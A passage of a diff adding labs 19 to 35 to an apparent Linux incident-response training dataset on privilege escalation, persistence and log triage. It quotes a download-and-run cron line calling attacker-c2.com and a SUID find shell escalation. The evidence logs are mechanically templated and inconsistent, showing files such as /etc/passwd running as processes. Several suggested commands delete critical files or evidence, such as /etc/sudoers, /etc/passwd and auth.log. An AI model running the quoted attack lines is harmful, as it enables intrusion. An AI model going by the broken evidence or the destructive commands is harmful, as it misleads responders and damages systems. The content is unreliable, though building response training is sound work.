+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  3302 85.0  0.4  12480  4012 ?        R    14:20  15:42 /tmp/dropper\nroot      3301  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /tmp/dropper",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.99:54102  192.168.1.99:4444 users:((\"tmp\",pid=3302,fd=3))",
+      "auth": "Aug 03 14:19:58 staging-node auditd[1200]: SYSCALL=execve exe=\"/tmp/dropper\" pid=3302 uid=1000\nAug 03 14:20:00 staging-node sshd[4512]: Session opened for user root from 192.168.1.99",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /tmp/dropper"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 3302",
+      "ss -antp | grep 192.168.1.99",
+      "ls -la /tmp/dropper",
+      "kill -9 3302",
+      "rm -f /tmp/dropper",
+      "sudo ufw deny out to 192.168.1.99"
+    ],
+    "targetPid": "3302",
+    "targetFile": "/tmp/dropper",
+    "targetIp": "192.168.1.99",
+    "containmentCmd": "strings /tmp/dropper | grep -E '[0-9]{1,3}\\.'",
+    "teluguTip": "Extract embedded IPs and URLs from suspicious binaries using strings | grep -E!"
+  },
+  {
+    "id": "lab20",
+    "labNumber": 20,
+    "categoryId": 4,
+    "categoryTitle": "Module 04: File System & Inode Forensics (Labs 16-20)",
+    "caseId": "INC-2026-8820",
+    "title": "Lab 20: Massive Database Backup Archive Staging Triage",
+    "severity": "HIGH",
+    "mitreId": "T1560",
+    "mitreName": "Technique T1560",
+    "targetHost": "db-node-01",
+    "targetIP": "10.0.2.5",
+    "alertBriefing": "SIEM Alert #8820: Large tar.gz archive (12GB) staged in /tmp/db_dump.tar.gz.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  8912 85.0  0.4  12480  4012 ?        R    14:20  15:42 /tmp/db_dump.tar.gz\nroot      8911  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /tmp/db_dump.tar.gz",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.2.5:54102  10.0.2.5:4444 users:((\"tmp\",pid=8912,fd=3))",
+      "auth": "Aug 03 14:19:58 db-node-01 auditd[1200]: SYSCALL=execve exe=\"/tmp/db_dump.tar.gz\" pid=8912 uid=1000\nAug 03 14:20:00 db-node-01 sshd[4512]: Session opened for user root from 10.0.2.5",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /tmp/db_dump.tar.gz"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 8912",
+      "ss -antp | grep 10.0.2.5",
+      "ls -la /tmp/db_dump.tar.gz",
+      "kill -9 8912",
+      "rm -f /tmp/db_dump.tar.gz",
+      "sudo ufw deny out to 10.0.2.5"
+    ],
+    "targetPid": "8912",
+    "targetFile": "/tmp/db_dump.tar.gz",
+    "targetIp": "10.0.2.5",
+    "containmentCmd": "rm -f /tmp/db_dump.tar.gz",
+    "teluguTip": "Detect data exfiltration staging by searching for unusually large archives in /tmp!"
+  },
+  {
+    "id": "lab21",
+    "labNumber": 21,
+    "categoryId": 5,
+    "categoryTitle": "Module 05: Privilege Escalation & SUID Abuse (Labs 21-25)",
+    "caseId": "INC-2026-8821",
+    "title": "Lab 21: SUID GTFOBins /usr/bin/find Root Escalation",
+    "severity": "CRITICAL",
+    "mitreId": "T1548.001",
+    "mitreName": "Technique T1548.001",
+    "targetHost": "app-node-03",
+    "targetIP": "172.16.5.20",
+    "alertBriefing": "SIEM Alert #8821: Unprivileged user executed find . -exec /bin/sh \\; with SUID bit set.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  10420 85.0  0.4  12480  4012 ?        R    14:20  15:42 /usr/bin/find\nroot      10419  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /usr/bin/find",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      172.16.5.20:54102  172.16.5.20:4444 users:((\"usr\",pid=10420,fd=3))",
+      "auth": "Aug 03 14:19:58 app-node-03 auditd[1200]: SYSCALL=execve exe=\"/usr/bin/find\" pid=10420 uid=1000\nAug 03 14:20:00 app-node-03 sshd[4512]: Session opened for user root from 172.16.5.20",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /usr/bin/find"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 10420",
+      "ss -antp | grep 172.16.5.20",
+      "ls -la /usr/bin/find",
+      "kill -9 10420",
+      "rm -f /usr/bin/find",
+      "sudo ufw deny out to 172.16.5.20"
+    ],
+    "targetPid": "10420",
+    "targetFile": "/usr/bin/find",
+    "targetIp": "172.16.5.20",
+    "containmentCmd": "chmod u-s /usr/bin/find && kill -9 10420",
+    "teluguTip": "Revoke SUID permission bit using chmod u-s <binary> and terminate root shell!"
+  },
+  {
+    "id": "lab22",
+    "labNumber": 22,
+    "categoryId": 5,
+    "categoryTitle": "Module 05: Privilege Escalation & SUID Abuse (Labs 21-25)",
+    "caseId": "INC-2026-8822",
+    "title": "Lab 22: Sudoers Wildcard NOPASSWD Escalation Triage",
+    "severity": "HIGH",
+    "mitreId": "T1548.002",
+    "mitreName": "Technique T1548.002",
+    "targetHost": "sys-admin-01",
+    "targetIP": "192.168.1.15",
+    "alertBriefing": "SIEM Alert #8822: NOPASSWD: ALL entry added to /etc/sudoers for user 'developer'.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  7102 85.0  0.4  12480  4012 ?        R    14:20  15:42 /etc/sudoers\nroot      7101  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /etc/sudoers",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.15:54102  192.168.1.15:4444 users:((\"etc\",pid=7102,fd=3))",
+      "auth": "Aug 03 14:19:58 sys-admin-01 auditd[1200]: SYSCALL=execve exe=\"/etc/sudoers\" pid=7102 uid=1000\nAug 03 14:20:00 sys-admin-01 sshd[4512]: Session opened for user root from 192.168.1.15",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /etc/sudoers"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 7102",
+      "ss -antp | grep 192.168.1.15",
+      "ls -la /etc/sudoers",
+      "kill -9 7102",
+      "rm -f /etc/sudoers",
+      "sudo ufw deny out to 192.168.1.15"
+    ],
+    "targetPid": "7102",
+    "targetFile": "/etc/sudoers",
+    "targetIp": "192.168.1.15",
+    "containmentCmd": "visudo -c && sed -i '/developer/d' /etc/sudoers",
+    "teluguTip": "Audit sudoers rules for NOPASSWD wildcards and clean rules using visudo!"
+  },
+  {
+    "id": "lab23",
+    "labNumber": 23,
+    "categoryId": 5,
+    "categoryTitle": "Module 05: Privilege Escalation & SUID Abuse (Labs 21-25)",
+    "caseId": "INC-2026-8823",
+    "title": "Lab 23: Dirty Pipe Kernel Privilege Escalation Triage",
+    "severity": "CRITICAL",
+    "mitreId": "T1068",
+    "mitreName": "Technique T1068",
+    "targetHost": "legacy-ubuntu",
+    "targetIP": "10.0.1.50",
+    "alertBriefing": "SIEM Alert #8823: Kernel pipe buffer overwrite attempt on /etc/passwd (CVE-2022-0847).",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  9901 85.0  0.4  12480  4012 ?        R    14:20  15:42 /etc/passwd\nroot      9900  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /etc/passwd",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.1.50:54102  10.0.1.50:4444 users:((\"etc\",pid=9901,fd=3))",
+      "auth": "Aug 03 14:19:58 legacy-ubuntu auditd[1200]: SYSCALL=execve exe=\"/etc/passwd\" pid=9901 uid=1000\nAug 03 14:20:00 legacy-ubuntu sshd[4512]: Session opened for user root from 10.0.1.50",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /etc/passwd"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 9901",
+      "ss -antp | grep 10.0.1.50",
+      "ls -la /etc/passwd",
+      "kill -9 9901",
+      "rm -f /etc/passwd",
+      "sudo ufw deny out to 10.0.1.50"
+    ],
+    "targetPid": "9901",
+    "targetFile": "/etc/passwd",
+    "targetIp": "10.0.1.50",
+    "containmentCmd": "kill -9 9901",
+    "teluguTip": "Dirty Pipe exploits vulnerability in Linux kernel pipe buffers. Patch kernel immediately!"
+  },
+  {
+    "id": "lab24",
+    "labNumber": 24,
+    "categoryId": 5,
+    "categoryTitle": "Module 05: Privilege Escalation & SUID Abuse (Labs 21-25)",
+    "caseId": "INC-2026-8824",
+    "title": "Lab 24: PKEXEC SUID Vulnerability Abuse Triage",
+    "severity": "CRITICAL",
+    "mitreId": "T1068",
+    "mitreName": "Technique T1068",
+    "targetHost": "vulnerable-node",
+    "targetIP": "192.168.1.88",
+    "alertBriefing": "SIEM Alert #8824: PKEYEXEC memory execution vulnerability triggered (PwnKit CVE-2021-4034).",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  8410 85.0  0.4  12480  4012 ?        R    14:20  15:42 /usr/bin/pkexec\nroot      8409  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /usr/bin/pkexec",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.88:54102  192.168.1.88:4444 users:((\"usr\",pid=8410,fd=3))",
+      "auth": "Aug 03 14:19:58 vulnerable-node auditd[1200]: SYSCALL=execve exe=\"/usr/bin/pkexec\" pid=8410 uid=1000\nAug 03 14:20:00 vulnerable-node sshd[4512]: Session opened for user root from 192.168.1.88",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /usr/bin/pkexec"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 8410",
+      "ss -antp | grep 192.168.1.88",
+      "ls -la /usr/bin/pkexec",
+      "kill -9 8410",
+      "rm -f /usr/bin/pkexec",
+      "sudo ufw deny out to 192.168.1.88"
+    ],
+    "targetPid": "8410",
+    "targetFile": "/usr/bin/pkexec",
+    "targetIp": "192.168.1.88",
+    "containmentCmd": "chmod 0755 /usr/bin/pkexec",
+    "teluguTip": "Mitigate PwnKit by revoking SUID permissions from /usr/bin/pkexec!"
+  },
+  {
+    "id": "lab25",
+    "labNumber": 25,
+    "categoryId": 5,
+    "categoryTitle": "Module 05: Privilege Escalation & SUID Abuse (Labs 21-25)",
+    "caseId": "INC-2026-8825",
+    "title": "Lab 25: Unprivileged Linux Capabilities Escalation",
+    "severity": "HIGH",
+    "mitreId": "T1548",
+    "mitreName": "Technique T1548",
+    "targetHost": "container-host",
+    "targetIP": "10.244.2.10",
+    "alertBriefing": "SIEM Alert #8825: cap_setuid+ep capability set on python3 binary allowing root escalation.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  6102 85.0  0.4  12480  4012 ?        R    14:20  15:42 /usr/bin/python3\nroot      6101  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /usr/bin/python3",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.244.2.10:54102  10.244.2.10:4444 users:((\"usr\",pid=6102,fd=3))",
+      "auth": "Aug 03 14:19:58 container-host auditd[1200]: SYSCALL=execve exe=\"/usr/bin/python3\" pid=6102 uid=1000\nAug 03 14:20:00 container-host sshd[4512]: Session opened for user root from 10.244.2.10",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /usr/bin/python3"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 6102",
+      "ss -antp | grep 10.244.2.10",
+      "ls -la /usr/bin/python3",
+      "kill -9 6102",
+      "rm -f /usr/bin/python3",
+      "sudo ufw deny out to 10.244.2.10"
+    ],
+    "targetPid": "6102",
+    "targetFile": "/usr/bin/python3",
+    "targetIp": "10.244.2.10",
+    "containmentCmd": "setcap -r /usr/bin/python3",
+    "teluguTip": "Remove dangerous capabilities from binaries using setcap -r <binary>!"
+  },
+  {
+    "id": "lab26",
+    "labNumber": 26,
+    "categoryId": 6,
+    "categoryTitle": "Module 06: Persistence Mechanism Hunting (Labs 26-30)",
+    "caseId": "INC-2026-8826",
+    "title": "Lab 26: Malicious Crontab Scheduled Task Ingestion",
+    "severity": "CRITICAL",
+    "mitreId": "T1053.003",
+    "mitreName": "Technique T1053.003",
+    "targetHost": "sec-ops-01",
+    "targetIP": "192.168.1.50",
+    "alertBriefing": "SIEM Alert #8826: Cron entry executing 'curl -s http://attacker-c2.com/rev.sh | bash' every 5 minutes.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  14502 85.0  0.4  12480  4012 ?        R    14:20  15:42 /etc/crontab\nroot      14501  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /etc/crontab",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.50:54102  attacker-c2.com:4444 users:((\"etc\",pid=14502,fd=3))",
+      "auth": "Aug 03 14:19:58 sec-ops-01 auditd[1200]: SYSCALL=execve exe=\"/etc/crontab\" pid=14502 uid=1000\nAug 03 14:20:00 sec-ops-01 sshd[4512]: Session opened for user root from attacker-c2.com",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /etc/crontab"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 14502",
+      "ss -antp | grep attacker-c2.com",
+      "ls -la /etc/crontab",
+      "kill -9 14502",
+      "rm -f /etc/crontab",
+      "sudo ufw deny out to attacker-c2.com"
+    ],
+    "targetPid": "14502",
+    "targetFile": "/etc/crontab",
+    "targetIp": "attacker-c2.com",
+    "containmentCmd": "sed -i '/attacker-c2/d' /etc/crontab && systemctl restart cron",
+    "teluguTip": "Remove rogue crontab lines using sed -i and restart the cron daemon!"
+  },
+  {
+    "id": "lab27",
+    "labNumber": 27,
+    "categoryId": 6,
+    "categoryTitle": "Module 06: Persistence Mechanism Hunting (Labs 26-30)",
+    "caseId": "INC-2026-8827",
+    "title": "Lab 27: Systemd Backdoor Unit Service Persistence",
+    "severity": "CRITICAL",
+    "mitreId": "T1543.002",
+    "mitreName": "Technique T1543.002",
+    "targetHost": "web-srv-04",
+    "targetIP": "10.0.1.80",
+    "alertBriefing": "SIEM Alert #8827: Rogue systemd service /etc/systemd/system/backdoor.service established.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  3301 85.0  0.4  12480  4012 ?        R    14:20  15:42 /etc/systemd/system/backdoor.service\nroot      3300  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /etc/systemd/system/backdoor.service",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.1.80:54102  10.0.1.80:4444 users:((\"etc\",pid=3301,fd=3))",
+      "auth": "Aug 03 14:19:58 web-srv-04 auditd[1200]: SYSCALL=execve exe=\"/etc/systemd/system/backdoor.service\" pid=3301 uid=1000\nAug 03 14:20:00 web-srv-04 sshd[4512]: Session opened for user root from 10.0.1.80",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /etc/systemd/system/backdoor.service"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 3301",
+      "ss -antp | grep 10.0.1.80",
+      "ls -la /etc/systemd/system/backdoor.service",
+      "kill -9 3301",
+      "rm -f /etc/systemd/system/backdoor.service",
+      "sudo ufw deny out to 10.0.1.80"
+    ],
+    "targetPid": "3301",
+    "targetFile": "/etc/systemd/system/backdoor.service",
+    "targetIp": "10.0.1.80",
+    "containmentCmd": "systemctl stop backdoor.service && systemctl disable backdoor.service && rm -f /etc/systemd/system/backdoor.service",
+    "teluguTip": "Stop, disable, and remove rogue systemd service unit files!"
+  },
+  {
+    "id": "lab28",
+    "labNumber": 28,
+    "categoryId": 6,
+    "categoryTitle": "Module 06: Persistence Mechanism Hunting (Labs 26-30)",
+    "caseId": "INC-2026-8828",
+    "title": "Lab 28: SSH Authorized Public Key Injection Persistence",
+    "severity": "CRITICAL",
+    "mitreId": "T1098.004",
+    "mitreName": "Technique T1098.004",
+    "targetHost": "db-master-02",
+    "targetIP": "10.0.2.15",
+    "alertBriefing": "SIEM Alert #8828: Attacker added unauthorized RSA public key to /root/.ssh/authorized_keys.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  9102 85.0  0.4  12480  4012 ?        R    14:20  15:42 /root/.ssh/authorized_keys\nroot      9101  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /root/.ssh/authorized_keys",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.2.15:54102  198.51.100.44:4444 users:((\"root\",pid=9102,fd=3))",
+      "auth": "Aug 03 14:19:58 db-master-02 auditd[1200]: SYSCALL=execve exe=\"/root/.ssh/authorized_keys\" pid=9102 uid=1000\nAug 03 14:20:00 db-master-02 sshd[4512]: Session opened for user root from 198.51.100.44",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /root/.ssh/authorized_keys"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 9102",
+      "ss -antp | grep 198.51.100.44",
+      "ls -la /root/.ssh/authorized_keys",
+      "kill -9 9102",
+      "rm -f /root/.ssh/authorized_keys",
+      "sudo ufw deny out to 198.51.100.44"
+    ],
+    "targetPid": "9102",
+    "targetFile": "/root/.ssh/authorized_keys",
+    "targetIp": "198.51.100.44",
+    "containmentCmd": "sed -i '/attacker@external/d' /root/.ssh/authorized_keys",
+    "teluguTip": "Inspect ~/.ssh/authorized_keys for unauthorized keys and purge using sed!"
+  },
+  {
+    "id": "lab29",
+    "labNumber": 29,
+    "categoryId": 6,
+    "categoryTitle": "Module 06: Persistence Mechanism Hunting (Labs 26-30)",
+    "caseId": "INC-2026-8829",
+    "title": "Lab 29: User Shell Profile .bashrc Alias Hijack",
+    "severity": "HIGH",
+    "mitreId": "T1546.004",
+    "mitreName": "Technique T1546.004",
+    "targetHost": "workstation-09",
+    "targetIP": "192.168.1.200",
+    "alertBriefing": "SIEM Alert #8829: Alias added to ~/.bashrc wrapping 'sudo' to harvest passwords.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  1102 85.0  0.4  12480  4012 ?        R    14:20  15:42 /home/ubuntu/.bashrc\nroot      1101  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /home/ubuntu/.bashrc",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.200:54102  192.168.1.200:4444 users:((\"home\",pid=1102,fd=3))",
+      "auth": "Aug 03 14:19:58 workstation-09 auditd[1200]: SYSCALL=execve exe=\"/home/ubuntu/.bashrc\" pid=1102 uid=1000\nAug 03 14:20:00 workstation-09 sshd[4512]: Session opened for user root from 192.168.1.200",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /home/ubuntu/.bashrc"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 1102",
+      "ss -antp | grep 192.168.1.200",
+      "ls -la /home/ubuntu/.bashrc",
+      "kill -9 1102",
+      "rm -f /home/ubuntu/.bashrc",
+      "sudo ufw deny out to 192.168.1.200"
+    ],
+    "targetPid": "1102",
+    "targetFile": "/home/ubuntu/.bashrc",
+    "targetIp": "192.168.1.200",
+    "containmentCmd": "sed -i '/alias sudo=/d' /home/ubuntu/.bashrc",
+    "teluguTip": "Inspect user shell profiles (~/.bashrc, ~/.profile) for malicious aliases!"
+  },
+  {
+    "id": "lab30",
+    "labNumber": 30,
+    "categoryId": 6,
+    "categoryTitle": "Module 06: Persistence Mechanism Hunting (Labs 26-30)",
+    "caseId": "INC-2026-8830",
+    "title": "Lab 30: Systemd Timer Unit Persistence Hunting",
+    "severity": "HIGH",
+    "mitreId": "T1053",
+    "mitreName": "Technique T1053",
+    "targetHost": "infra-node-01",
+    "targetIP": "10.0.0.12",
+    "alertBriefing": "SIEM Alert #8830: Rogue systemd timer unit configured to trigger reverse shell hourly.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  5401 85.0  0.4  12480  4012 ?        R    14:20  15:42 /etc/systemd/system/backdoor.timer\nroot      5400  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /etc/systemd/system/backdoor.timer",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.0.12:54102  10.0.0.12:4444 users:((\"etc\",pid=5401,fd=3))",
+      "auth": "Aug 03 14:19:58 infra-node-01 auditd[1200]: SYSCALL=execve exe=\"/etc/systemd/system/backdoor.timer\" pid=5401 uid=1000\nAug 03 14:20:00 infra-node-01 sshd[4512]: Session opened for user root from 10.0.0.12",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /etc/systemd/system/backdoor.timer"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 5401",
+      "ss -antp | grep 10.0.0.12",
+      "ls -la /etc/systemd/system/backdoor.timer",
+      "kill -9 5401",
+      "rm -f /etc/systemd/system/backdoor.timer",
+      "sudo ufw deny out to 10.0.0.12"
+    ],
+    "targetPid": "5401",
+    "targetFile": "/etc/systemd/system/backdoor.timer",
+    "targetIp": "10.0.0.12",
+    "containmentCmd": "systemctl disable --now backdoor.timer",
+    "teluguTip": "List systemd timers with systemctl list-timers and disable rogue timer units!"
+  },
+  {
+    "id": "lab31",
+    "labNumber": 31,
+    "categoryId": 7,
+    "categoryTitle": "Module 07: Log Analysis & Journalctl Triage (Labs 31-35)",
+    "caseId": "INC-2026-8831",
+    "title": "Lab 31: SSH Password Brute Force Attack Log Analysis",
+    "severity": "HIGH",
+    "mitreId": "T1110.001",
+    "mitreName": "Technique T1110.001",
+    "targetHost": "edge-gateway",
+    "targetIP": "198.51.100.1",
+    "alertBriefing": "SIEM Alert #8831: Over 500 failed SSH login attempts from source IP 192.168.1.105.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  4512 85.0  0.4  12480  4012 ?        R    14:20  15:42 /var/log/auth.log\nroot      4511  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /var/log/auth.log",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      198.51.100.1:54102  192.168.1.105:4444 users:((\"var\",pid=4512,fd=3))",
+      "auth": "Aug 03 14:19:58 edge-gateway auditd[1200]: SYSCALL=execve exe=\"/var/log/auth.log\" pid=4512 uid=1000\nAug 03 14:20:00 edge-gateway sshd[4512]: Session opened for user root from 192.168.1.105",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /var/log/auth.log"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 4512",
+      "ss -antp | grep 192.168.1.105",
+      "ls -la /var/log/auth.log",
+      "kill -9 4512",
+      "rm -f /var/log/auth.log",
+      "sudo ufw deny out to 192.168.1.105"
+    ],
+    "targetPid": "4512",
+    "targetFile": "/var/log/auth.log",
+    "targetIp": "192.168.1.105",
+    "containmentCmd": "sudo ufw deny from 192.168.1.105",
+    "teluguTip": "Identify brute force IPs in /var/log/auth.log and block via UFW or Fail2ban!"
+  },
+  {
+    "id": "lab32",
+    "labNumber": 32,
+    "categoryId": 7,
+    "categoryTitle": "Module 07: Log Analysis & Journalctl Triage (Labs 31-35)",
+    "caseId": "INC-2026-8832",
+    "title": "Lab 32: PAM Authentication Failure Flood Triage",
+    "severity": "MEDIUM",
+    "mitreId": "T1110",
+    "mitreName": "Technique T1110",
+    "targetHost": "vpn-node",
+    "targetIP": "10.0.9.1",
+    "alertBriefing": "SIEM Alert #8832: High frequency PAM authentication failures logged in journalctl.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  2201 85.0  0.4  12480  4012 ?        R    14:20  15:42 journalctl\nroot      2200  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c journalctl",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.9.1:54102  10.0.9.1:4444 users:((\"bash\",pid=2201,fd=3))",
+      "auth": "Aug 03 14:19:58 vpn-node auditd[1200]: SYSCALL=execve exe=\"journalctl\" pid=2201 uid=1000\nAug 03 14:20:00 vpn-node sshd[4512]: Session opened for user root from 10.0.9.1",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 journalctl"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 2201",
+      "ss -antp | grep 10.0.9.1",
+      "ls -la journalctl",
+      "kill -9 2201",
+      "rm -f journalctl",
+      "sudo ufw deny out to 10.0.9.1"
+    ],
+    "targetPid": "2201",
+    "targetFile": "journalctl",
+    "targetIp": "10.0.9.1",
+    "containmentCmd": "journalctl -u sshd --since '1 hour ago'",
+    "teluguTip": "Use journalctl -u sshd to inspect PAM failure rates and block offending IPs!"
+  },
+  {
+    "id": "lab33",
+    "labNumber": 33,
+    "categoryId": 7,
+    "categoryTitle": "Module 07: Log Analysis & Journalctl Triage (Labs 31-35)",
+    "caseId": "INC-2026-8833",
+    "title": "Lab 33: System Log Erasure & History Wiping Detection",
+    "severity": "HIGH",
+    "mitreId": "T1070.002",
+    "mitreName": "Technique T1070.002",
+    "targetHost": "target-server",
+    "targetIP": "192.168.1.60",
+    "alertBriefing": "SIEM Alert #8833: Commands history -c and > ~/.bash_history executed by user.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  9001 85.0  0.4  12480  4012 ?        R    14:20  15:42 ~/.bash_history\nroot      9000  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c ~/.bash_history",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.60:54102  192.168.1.60:4444 users:((\".bash_history\",pid=9001,fd=3))",
+      "auth": "Aug 03 14:19:58 target-server auditd[1200]: SYSCALL=execve exe=\"~/.bash_history\" pid=9001 uid=1000\nAug 03 14:20:00 target-server sshd[4512]: Session opened for user root from 192.168.1.60",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 ~/.bash_history"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 9001",
+      "ss -antp | grep 192.168.1.60",
+      "ls -la ~/.bash_history",
+      "kill -9 9001",
+      "rm -f ~/.bash_history",
+      "sudo ufw deny out to 192.168.1.60"
+    ],
+    "targetPid": "9001",
+    "targetFile": "~/.bash_history",
+    "targetIp": "192.168.1.60",
+    "containmentCmd": "chattr +a ~/.bash_history",
+    "teluguTip": "Make bash history files append-only using chattr +a ~/.bash_history!"
+  },
+  {
+    "id": "lab34",
+    "labNumber": 34,
+    "categoryId": 7,
+    "categoryTitle": "Module 07: Log Analysis & Journalctl Triage (Labs 31-35)",
+    "caseId": "INC-2026-8834",
+    "title": "Lab 34: Sudo Interactive Command Audit Log Triage",
+    "severity": "MEDIUM",
+    "mitreId": "T1548.002",
+    "mitreName": "Technique T1548.002",
+    "targetHost": "app-node-02",
+    "targetIP": "172.16.1.40",
+    "alertBriefing": "SIEM Alert #8834: Sudo command execution logged: USER=root COMMAND=/bin/bash.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  3310 85.0  0.4  12480  4012 ?        R    14:20  15:42 /var/log/auth.log\nroot      3309  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /var/log/auth.log",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      172.16.1.40:54102  172.16.1.40:4444 users:((\"var\",pid=3310,fd=3))",
+      "auth": "Aug 03 14:19:58 app-node-02 auditd[1200]: SYSCALL=execve exe=\"/var/log/auth.log\" pid=3310 uid=1000\nAug 03 14:20:00 app-node-02 sshd[4512]: Session opened for user root from 172.16.1.40",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /var/log/auth.log"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 3310",
+      "ss -antp | grep 172.16.1.40",
+      "ls -la /var/log/auth.log",
+      "kill -9 3310",
+      "rm -f /var/log/auth.log",
+      "sudo ufw deny out to 172.16.1.40"
+    ],
+    "targetPid": "3310",
+    "targetFile": "/var/log/auth.log",
+    "targetIp": "172.16.1.40",
+    "containmentCmd": "grep 'COMMAND=' /var/log/auth.log | tail -n 20",
+    "teluguTip": "Audit sudo command logs to trace privilege elevation commands!"
+  },
+  {
+    "id": "lab35",
+    "labNumber": 35,
+    "categoryId": 7,
